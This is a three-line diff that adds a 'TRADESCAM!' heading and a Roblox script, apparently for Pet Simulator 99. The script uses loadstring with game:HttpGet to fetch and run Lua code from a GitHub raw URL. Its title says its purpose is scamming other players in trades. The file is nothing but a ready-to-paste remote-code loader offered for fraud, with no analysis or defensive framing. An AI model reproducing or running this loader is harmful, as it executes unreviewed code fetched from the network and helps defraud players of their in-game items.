@@ -1,0 +1,3 @@
+TRADESCAM!
+SCRIPT:
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PS99ROBLOXSCRIPTS/tradescam/main/ps99"))()
